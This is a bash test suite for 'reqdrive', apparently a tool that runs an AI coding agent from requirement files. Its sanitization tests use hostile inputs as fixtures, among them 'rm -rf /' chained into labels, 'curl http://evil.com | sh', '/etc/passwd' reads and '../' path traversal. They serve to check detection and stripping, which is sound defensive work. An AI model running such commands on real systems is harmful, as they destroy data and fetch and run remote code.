#!/usr/bin/env bash
# Simple test runner for reqdrive v0.3.0 (no bats dependency)
# shellcheck disable=SC1091,SC2016,SC2034,SC2030,SC2031,SC2064,SC2317,SC1003
# SC1091: dynamic source paths
# SC2016: single-quoted shell metacharacters are intentional (injection tests)
# SC2034: variables used by sourced code (RUN_SUMMARY_*, etc.)
# SC2030/SC2031: subshell variable modification is intentional in test cases
# SC2064: trap with expanded variables is intentional in test subshells
# SC2317: mock functions called via export -f appear "unreachable" to shellcheck
# SC1003: backslash in test patterns is intentional
set +e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
export REQDRIVE_ROOT="$PROJECT_ROOT"

PASS=0
FAIL=0
SKIP=0
TOTAL=0

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

# Check if claude binary is available
HAS_CLAUDE=false
if command -v claude &>/dev/null; then
  HAS_CLAUDE=true
fi

test_result() {
  local name="$1"
  local status="$2"
  TOTAL=$((TOTAL + 1))
  if [ "$status" -eq 0 ]; then
    PASS=$((PASS + 1))
    echo -e "${GREEN}PASS${NC}: $name"
  else
    FAIL=$((FAIL + 1))
    echo -e "${RED}FAIL${NC}: $name"
  fi
}

test_skip() {
  local name="$1"
  local reason="${2:-skipped}"
  TOTAL=$((TOTAL + 1))
  SKIP=$((SKIP + 1))
  echo -e "${YELLOW}SKIP${NC}: $name ($reason)"
}

# Create temp directory
TEST_TEMP=$(mktemp -d) || { echo "FATAL: mktemp failed" >&2; exit 1; }
[ -n "$TEST_TEMP" ] && [ -d "$TEST_TEMP" ] || { echo "FATAL: bad TEST_TEMP" >&2; exit 1; }
trap 'rm -rf "$TEST_TEMP"' EXIT

echo "========================================"
echo "  reqdrive v0.3.0 simple test suite"
echo "========================================"
echo ""

if [ "$HAS_CLAUDE" = "false" ]; then
  echo -e "${YELLOW}NOTE${NC}: 'claude' binary not found. Some tests will be skipped."
  echo ""
fi

# ─────────────────────────────────────────────
# Test: Config loading
# ─────────────────────────────────────────────
echo "--- Config: reqdrive_find_manifest ---"

# Test: reqdrive_find_manifest finds manifest in current dir
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/requirements","testCommand":"npm test"}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  result=$(reqdrive_find_manifest)
  [ "$result" = "$TEST_TEMP/reqdrive.json" ]
)
test_result "find_manifest: finds manifest in current dir" $?

# Test: reqdrive_find_manifest finds manifest in parent
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/requirements","testCommand":"npm test"}
EOF
  mkdir -p subdir/nested
  cd subdir/nested
  source "$REQDRIVE_ROOT/lib/config.sh"
  result=$(reqdrive_find_manifest)
  [ "$result" = "$TEST_TEMP/reqdrive.json" ]
)
test_result "find_manifest: finds manifest in parent dir" $?

# Test: reqdrive_find_manifest returns 1 when no manifest exists
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  source "$REQDRIVE_ROOT/lib/config.sh"
  ! reqdrive_find_manifest 2>/dev/null
)
test_result "find_manifest: returns 1 when no manifest found" $?

echo ""
echo "--- Config: reqdrive_load_config ---"

# Test: reqdrive_load_config loads all settings
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/reqs","testCommand":"npm test","model":"claude-opus-4-5-20251101","maxIterations":5,"baseBranch":"develop","projectName":"my-project"}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_REQUIREMENTS_DIR" = "docs/reqs" ] &&
  [ "$REQDRIVE_TEST_COMMAND" = "npm test" ] &&
  [ "$REQDRIVE_MODEL" = "claude-opus-4-5-20251101" ] &&
  [ "$REQDRIVE_MAX_ITERATIONS" = "5" ] &&
  [ "$REQDRIVE_BASE_BRANCH" = "develop" ] &&
  [ "$REQDRIVE_PROJECT_NAME" = "my-project" ]
)
test_result "load_config: loads all settings" $?

# Test: reqdrive_load_config uses defaults for missing fields
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_REQUIREMENTS_DIR" = "docs/requirements" ] &&
  [ "$REQDRIVE_MODEL" = "claude-sonnet-4-20250514" ] &&
  [ "$REQDRIVE_MAX_ITERATIONS" = "10" ] &&
  [ "$REQDRIVE_BASE_BRANCH" = "main" ]
)
test_result "load_config: uses defaults for missing fields" $?

# Test: reqdrive_load_config sets REQDRIVE_MANIFEST to manifest path
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_MANIFEST" = "$TEST_TEMP/reqdrive.json" ]
)
test_result "load_config: sets REQDRIVE_MANIFEST path" $?

# Test: reqdrive_load_config sets REQDRIVE_PROJECT_ROOT to manifest dir
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{}
EOF
  mkdir -p subdir
  cd subdir
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_PROJECT_ROOT" = "$TEST_TEMP" ]
)
test_result "load_config: sets REQDRIVE_PROJECT_ROOT to manifest dir" $?

# Test: reqdrive_load_config joins prLabels with commas
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"prLabels":["agent-generated","needs-review","auto"]}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_PR_LABELS" = "agent-generated,needs-review,auto" ]
)
test_result "load_config: joins prLabels with commas" $?

# Test: reqdrive_load_config defaults prLabels to agent-generated
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_PR_LABELS" = "agent-generated" ]
)
test_result "load_config: defaults prLabels to agent-generated" $?

# Test: reqdrive_load_config defaults testCommand to empty
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_TEST_COMMAND" = "" ]
)
test_result "load_config: defaults testCommand to empty string" $?

# Test: reqdrive_load_config defaults maxStoryRetries to 3
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_MAX_STORY_RETRIES" = "3" ]
)
test_result "load_config: defaults maxStoryRetries to 3" $?

# Test: reqdrive_load_config loads custom maxStoryRetries
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"maxStoryRetries": 5}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_MAX_STORY_RETRIES" = "5" ]
)
test_result "load_config: loads custom maxStoryRetries" $?

# Test: reqdrive_load_config defaults projectName to empty
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_PROJECT_NAME" = "" ]
)
test_result "load_config: defaults projectName to empty string" $?

# Test: reqdrive_load_config exits when no manifest found
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  source "$REQDRIVE_ROOT/lib/config.sh"
  output=$(reqdrive_load_config 2>&1) && exit 1
  echo "$output" | grep -q "No reqdrive.json found"
)
test_result "load_config: exits with error when no manifest" $?

# Test: reqdrive_load_config exits on incompatible schema version
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"version":"9.0.0"}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  output=$(reqdrive_load_config 2>&1) && exit 1
  echo "$output" | grep -q "Incompatible config version"
)
test_result "load_config: exits on incompatible schema version" $?

echo ""
echo "--- Config: reqdrive_get_req_file ---"

# Test: reqdrive_get_req_file finds requirement
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/requirements"}
EOF
  mkdir -p docs/requirements
  echo "# REQ-01" > docs/requirements/REQ-01-test-feature.md
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  result=$(reqdrive_get_req_file "REQ-01")
  [ -n "$result" ] && [ -f "$result" ]
)
test_result "get_req_file: finds matching requirement" $?

# Test: reqdrive_get_req_file returns 1 when no match
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/requirements"}
EOF
  mkdir -p docs/requirements
  # Only REQ-01 exists, ask for REQ-99
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  ! reqdrive_get_req_file "REQ-99" 2>/dev/null
)
test_result "get_req_file: returns 1 when no match" $?

# Test: reqdrive_get_req_file returns path including filename
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/requirements"}
EOF
  mkdir -p docs/requirements
  echo "# REQ-02" > docs/requirements/REQ-02-another-feature.md
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  result=$(reqdrive_get_req_file "REQ-02")
  [[ "$result" == *"REQ-02-another-feature.md" ]]
)
test_result "get_req_file: returns full path to matched file" $?

# Test: reqdrive_get_req_file uses configured requirementsDir
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"specs"}
EOF
  mkdir -p specs
  echo "# REQ-05" > specs/REQ-05-custom-dir.md
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  result=$(reqdrive_get_req_file "REQ-05")
  [[ "$result" == *"specs/REQ-05-custom-dir.md" ]]
)
test_result "get_req_file: respects custom requirementsDir" $?

echo ""
echo "--- Validation Tests ---"

# Test: validate passes for valid manifest
(
  set -e
  cd "$TEST_TEMP"
  mkdir -p docs/requirements
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/requirements","testCommand":"npm test"}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  output=$(source "$REQDRIVE_ROOT/lib/validate.sh" 2>&1)
  echo "$output" | grep -q "Validation PASSED"
)
test_result "validate: passes for valid manifest" $?

# Test: validate fails for invalid JSON
(
  set -e
  set +e
  cd "$TEST_TEMP"
  echo "{ invalid json }" > reqdrive.json
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config 2>/dev/null
  (set -e; source "$REQDRIVE_ROOT/lib/validate.sh") >/dev/null 2>&1
  status=$?
  [ "$status" -ne 0 ]
)
test_result "validate: fails for invalid JSON" $?

# Test: validate exits with EXIT_CONFIG_ERROR on a malformed config
(
  set -e
  cd "$TEST_TEMP"
  mkdir -p vex && cd vex
  echo 'not json at all' > reqdrive.json
  rc=0
  "$REQDRIVE_ROOT/bin/reqdrive" validate > /dev/null 2>&1 || rc=$?
  [ "$rc" -eq 3 ]
)
test_result "validate: exits 3 (EXIT_CONFIG_ERROR) on malformed config" $?

# Test: validate exits 3 on a type violation
(
  set -e
  cd "$TEST_TEMP"
  mkdir -p vex2 && cd vex2
  echo '{"maxIterations":"ten"}' > reqdrive.json
  rc=0
  "$REQDRIVE_ROOT/bin/reqdrive" validate > /dev/null 2>&1 || rc=$?
  [ "$rc" -eq 3 ]
)
test_result "validate: exits 3 on a config type violation" $?

echo ""
echo "--- Sanitize: sanitize_for_prompt ---"

# Test: sanitize_for_prompt escapes backticks and dollar signs
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  input='echo $(whoami) and `id`'
  result=$(sanitize_for_prompt "$input")
  echo "$result" | grep -qF '\$' && echo "$result" | grep -qF "'"
)
test_result "sanitize_for_prompt: escapes backticks and dollar signs" $?

# Test: sanitize_for_prompt passes clean content through unchanged
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  input='Hello world, this is plain text with no special chars.'
  result=$(sanitize_for_prompt "$input")
  [ "$result" = "$input" ]
)
test_result "sanitize_for_prompt: clean content passes through unchanged" $?

# Test: sanitize_for_prompt handles empty input
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_for_prompt "")
  [ -z "$result" ]
)
test_result "sanitize_for_prompt: empty input returns empty" $?

# Test: sanitize_for_prompt escapes ${VAR} expansion
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  input='use ${HOME} for path'
  result=$(sanitize_for_prompt "$input")
  # Result should be: use \${HOME} for path
  echo "$result" | grep -qF '\${'
)
test_result "sanitize_for_prompt: escapes \${VAR} expansion" $?

echo ""
echo "--- Sanitize: sanitize_label ---"

# Test: sanitize_label passes clean label through
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label "agent-generated")
  [ "$result" = "agent-generated" ]
)
test_result "sanitize_label: clean label passes through" $?

# Test: sanitize_label strips leading/trailing whitespace
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label "  my-label  ")
  [ "$result" = "my-label" ]
)
test_result "sanitize_label: strips whitespace" $?

# Test: sanitize_label removes semicolons
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label 'label;rm -rf /')
  [[ "$result" != *";"* ]]
)
test_result "sanitize_label: removes semicolons" $?

# Test: sanitize_label removes pipes
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label 'label|cat /etc/passwd')
  [[ "$result" != *"|"* ]]
)
test_result "sanitize_label: removes pipes" $?

# Test: sanitize_label removes ampersands
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label 'label&& echo pwned')
  [[ "$result" != *"&"* ]]
)
test_result "sanitize_label: removes ampersands" $?

# Test: sanitize_label removes redirects
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label 'label > /tmp/out < /etc/passwd')
  [[ "$result" != *">"* ]] && [[ "$result" != *"<"* ]]
)
test_result "sanitize_label: removes redirect characters" $?

# Test: sanitize_label removes dollar signs
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label 'label$HOME')
  [[ "$result" != *'$'* ]]
)
test_result "sanitize_label: removes dollar signs" $?

# Test: sanitize_label removes backslashes
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label 'label\\path')
  [[ "$result" != *'\\'* ]]
)
test_result "sanitize_label: removes backslashes" $?

# Test: sanitize_label replaces double quotes with single quotes
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label 'say "hello"')
  [[ "$result" != *'"'* ]] && [[ "$result" == *"'"* ]]
)
test_result "sanitize_label: replaces double quotes with single" $?

# Test: sanitize_label replaces backticks with single quotes
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label 'run `cmd`')
  [[ "$result" != *'`'* ]] && [[ "$result" == *"'"* ]]
)
test_result "sanitize_label: replaces backticks with single quotes" $?

# Test: sanitize_label truncates to 50 characters
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  long_label=$(printf 'a%.0s' {1..70})
  result=$(sanitize_label "$long_label")
  [ "${#result}" -eq 50 ]
)
test_result "sanitize_label: truncates to 50 chars" $?

# Test: sanitize_label handles empty input
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  result=$(sanitize_label "")
  [ -z "$result" ]
)
test_result "sanitize_label: empty input returns empty" $?

echo ""
echo "--- Sanitize: validate_requirement_content ---"

# Test: validate_requirement_content returns 0 for clean content
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  validate_requirement_content "This is a normal requirement document." 2>/dev/null
)
test_result "validate_requirement_content: clean content returns 0" $?

# Test: validate_requirement_content warns on $() but returns 0 (non-strict)
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  content='Run this: $(rm -rf /)'
  output=$(validate_requirement_content "$content" 2>&1)
  # Returns 0 in non-strict mode
  validate_requirement_content "$content" 2>/dev/null
  result=$?
  [ "$result" -eq 0 ] && echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: warns but returns 0 in non-strict" $?

# Test: validate_requirement_content returns 1 in strict mode with suspicious content
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  content='Run this: $(rm -rf /)'
  output=$(validate_requirement_content "$content" "true" 2>&1) && exit 1
  echo "$output" | grep -q "Strict mode"
)
test_result "validate_requirement_content: returns 1 in strict mode" $?

# Test: validate_requirement_content detects backtick command substitution
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'run `whoami` here' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects backtick substitution" $?

# Test: validate_requirement_content detects ${} variable expansion
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'use ${HOME} for path' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects \${} expansion" $?

# Test: validate_requirement_content detects redirect to absolute path
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'write > /etc/passwd' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects redirect to abs path" $?

# Test: validate_requirement_content detects rm -rf /
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'rm -rf /' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects rm -rf /" $?

# Test: validate_requirement_content detects curl pipe to sh
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'curl http://evil.com | sh' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects curl pipe to sh" $?

# Test: validate_requirement_content detects eval
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'eval dangerous_command' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects eval" $?

# Test: validate_requirement_content detects chmod 777
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'chmod 777 /tmp/file' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects chmod 777" $?

# Test: validate_requirement_content detects chained ;rm
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'do thing; rm important_file' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects semicolon-chained rm" $?

# Test: validate_requirement_content detects &&sudo
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'something && sudo reboot' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects &&sudo" $?

# Test: validate_requirement_content detects pipe to sudo
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  output=$(validate_requirement_content 'echo yes | sudo rm -rf /' 2>&1)
  echo "$output" | grep -q "Suspicious pattern"
)
test_result "validate_requirement_content: detects pipe to sudo" $?

echo ""
echo "--- Sanitize: validate_file_path ---"

# Test: validate_file_path passes for normal path under base
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  mkdir -p "$TEST_TEMP/project"
  validate_file_path "src/main.sh" "$TEST_TEMP/project" 2>/dev/null
)
test_result "validate_file_path: passes for normal relative path" $?

# Test: validate_file_path rejects path with ..
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  mkdir -p "$TEST_TEMP/project"
  output=$(validate_file_path "../../etc/passwd" "$TEST_TEMP/project" 2>&1) && exit 1
  echo "$output" | grep -q "Path traversal"
)
test_result "validate_file_path: rejects .. traversal" $?

# Test: validate_file_path rejects mid-path traversal
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  mkdir -p "$TEST_TEMP/project"
  output=$(validate_file_path "src/../../../etc/passwd" "$TEST_TEMP/project" 2>&1) && exit 1
  echo "$output" | grep -q "Path traversal"
)
test_result "validate_file_path: rejects mid-path .. traversal" $?

echo ""
echo "--- Error Codes Tests ---"

# Test: errors.sh defines all exit codes
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  [ "$EXIT_SUCCESS" = "0" ] &&
  [ "$EXIT_GENERAL_ERROR" = "1" ] &&
  [ "$EXIT_MISSING_DEPENDENCY" = "2" ] &&
  [ "$EXIT_CONFIG_ERROR" = "3" ] &&
  [ "$EXIT_GIT_ERROR" = "4" ] &&
  [ "$EXIT_AGENT_ERROR" = "5" ] &&
  [ "$EXIT_PR_ERROR" = "6" ] &&
  [ "$EXIT_USER_ABORT" = "7" ] &&
  [ "$EXIT_PREFLIGHT_FAILED" = "8" ]
)
test_result "errors: defines the base exit codes 0-8" $?

# Test: EXIT_MESSAGES has entry for every exit code
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  [ -n "${EXIT_MESSAGES[0]}" ] &&
  [ -n "${EXIT_MESSAGES[1]}" ] &&
  [ -n "${EXIT_MESSAGES[2]}" ] &&
  [ -n "${EXIT_MESSAGES[3]}" ] &&
  [ -n "${EXIT_MESSAGES[4]}" ] &&
  [ -n "${EXIT_MESSAGES[5]}" ] &&
  [ -n "${EXIT_MESSAGES[6]}" ] &&
  [ -n "${EXIT_MESSAGES[7]}" ] &&
  [ -n "${EXIT_MESSAGES[8]}" ]
)
test_result "errors: EXIT_MESSAGES covers the base codes 0-8" $?

# Test: get_exit_message returns known message
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  [ "$(get_exit_message 0)" = "Success" ] &&
  [ "$(get_exit_message 3)" = "Configuration error" ] &&
  [ "$(get_exit_message 8)" = "Pre-flight checks failed" ]
)
test_result "errors: get_exit_message returns correct messages" $?

# Test: get_exit_message returns fallback for unknown code
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  [ "$(get_exit_message 99)" = "Unknown error" ]
)
test_result "errors: get_exit_message returns 'Unknown error' for unknown code" $?

# Test: die exits with given code and custom message
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  output=$(die 3 "bad config" 2>&1) || code=$?
  [ "$code" = "3" ] &&
  echo "$output" | grep -qF "[ERROR] bad config"
)
test_result "errors: die exits with code and custom message" $?

# Test: die uses default message from EXIT_MESSAGES when no msg given
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  output=$(die 5 2>&1) || code=$?
  [ "$code" = "5" ] &&
  echo "$output" | grep -qF "[ERROR] Agent execution failed"
)
test_result "errors: die uses EXIT_MESSAGES when no custom message" $?

# Test: die defaults to exit code 1 with no arguments
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  output=$(die 2>&1) || code=$?
  [ "$code" = "1" ]
)
test_result "errors: die defaults to exit code 1" $?

# Test: die_on_error does nothing after success
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  true
  die_on_error "should not fire"
  # If we get here, it didn't exit
)
test_result "errors: die_on_error is silent after success" $?

# Test: die_on_error exits after failure
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  # Subshell: force $? to non-zero then call die_on_error
  output=$(
    bash -c '
      source "'"$REQDRIVE_ROOT"'/lib/errors.sh"
      false
      die_on_error "it broke"
    ' 2>&1
  ) || code=$?
  [ "$code" = "1" ] &&
  echo "$output" | grep -qF "it broke"
)
test_result "errors: die_on_error exits after failure" $?

echo ""
echo "--- Preflight Tests ---"

# Test: check_git_repo fails outside git repo
(
  set -e
  cd "$TEST_TEMP"
  rm -rf "$TEST_TEMP/.git" 2>/dev/null || true
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  ! check_git_repo 2>/dev/null
)
test_result "preflight: check_git_repo fails outside repo" $?

# Test: check_clean_working_tree passes on clean repo
(
  set -e
  cd "$TEST_TEMP"
  git init -q
  git config user.email "test@test.com"
  git config user.name "Test"
  touch file.txt
  git add file.txt
  git commit -q -m "init"
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  check_clean_working_tree 2>/dev/null
)
test_result "preflight: check_clean_working_tree passes on clean repo" $?

# Test: check_clean_working_tree fails on dirty repo
(
  set -e
  cd "$TEST_TEMP"
  echo "dirty" >> file.txt
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  ! check_clean_working_tree 2>/dev/null
)
test_result "preflight: check_clean_working_tree fails on dirty repo" $?

echo ""
echo "--- Schema: check_schema_version ---"

# Test: check_schema_version warns on missing version
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"requirementsDir":"docs/requirements"}' > "$TEST_TEMP/no-version.json"
  output=$(check_schema_version "$TEST_TEMP/no-version.json" 2>&1)
  echo "$output" | grep -q "No version field"
)
test_result "schema: check_schema_version warns on missing version" $?

# Test: check_schema_version passes on correct version
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"version":"0.3.0"}' > "$TEST_TEMP/good-version.json"
  check_schema_version "$TEST_TEMP/good-version.json" 2>/dev/null
)
test_result "schema: check_schema_version passes on exact version" $?

# Test: check_schema_version errors on incompatible major version
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"version":"9.0.0"}' > "$TEST_TEMP/bad-version.json"
  ! check_schema_version "$TEST_TEMP/bad-version.json" 2>/dev/null
)
test_result "schema: check_schema_version rejects incompatible major" $?

# Test: check_schema_version passes for nonexistent file
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  check_schema_version "$TEST_TEMP/nonexistent.json" 2>/dev/null
)
test_result "schema: check_schema_version passes for nonexistent file" $?

# Test: check_schema_version accepts older minor (0.2.0 same major)
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"version":"0.2.0"}' > "$TEST_TEMP/older-minor.json"
  check_schema_version "$TEST_TEMP/older-minor.json" 2>/dev/null
)
test_result "schema: check_schema_version accepts older minor (0.2.0)" $?

# Test: check_schema_version warns on newer minor (0.9.0)
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"version":"0.9.0"}' > "$TEST_TEMP/newer-minor.json"
  output=$(check_schema_version "$TEST_TEMP/newer-minor.json" 2>&1)
  # Should still return 0 (warning, not error), but warn on stderr
  check_schema_version "$TEST_TEMP/newer-minor.json" 2>/dev/null &&
  echo "$output" | grep -q "newer than supported"
)
test_result "schema: check_schema_version warns on newer minor (0.9.0)" $?

# Test: check_schema_version accepts patch difference (0.3.1)
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"version":"0.3.1"}' > "$TEST_TEMP/patch-diff.json"
  check_schema_version "$TEST_TEMP/patch-diff.json" 2>/dev/null
)
test_result "schema: check_schema_version accepts patch difference (0.3.1)" $?

echo ""
echo "--- Schema: validate_config_schema ---"

# Test: validate_config_schema passes for valid config fixture
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  validate_config_schema "$REQDRIVE_ROOT/tests/fixtures/valid-manifest.json" 2>/dev/null
)
test_result "schema: validate_config_schema passes for valid config" $?

# Test: validate_config_schema passes for empty object
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{}' > "$TEST_TEMP/empty.json"
  validate_config_schema "$TEST_TEMP/empty.json" 2>/dev/null
)
test_result "schema: validate_config_schema passes for empty object" $?

# Test: validate_config_schema fails for invalid JSON
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo 'not json' > "$TEST_TEMP/bad.json"
  ! validate_config_schema "$TEST_TEMP/bad.json" 2>/dev/null
)
test_result "schema: validate_config_schema rejects invalid JSON" $?

# Test: validate_config_schema fails when requirementsDir is wrong type
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"requirementsDir": 123}' > "$TEST_TEMP/bad-type.json"
  output=$(validate_config_schema "$TEST_TEMP/bad-type.json" 2>&1) && exit 1
  echo "$output" | grep -q "requirementsDir must be a string"
)
test_result "schema: validate_config_schema rejects non-string requirementsDir" $?

# Test: validate_config_schema fails when maxIterations is wrong type
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"maxIterations": "ten"}' > "$TEST_TEMP/bad-iter.json"
  output=$(validate_config_schema "$TEST_TEMP/bad-iter.json" 2>&1) && exit 1
  echo "$output" | grep -q "maxIterations must be a number"
)
test_result "schema: validate_config_schema rejects non-number maxIterations" $?

# Test: validate_config_schema fails when prLabels is wrong type
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"prLabels": "not-an-array"}' > "$TEST_TEMP/bad-labels.json"
  output=$(validate_config_schema "$TEST_TEMP/bad-labels.json" 2>&1) && exit 1
  echo "$output" | grep -q "prLabels must be an array"
)
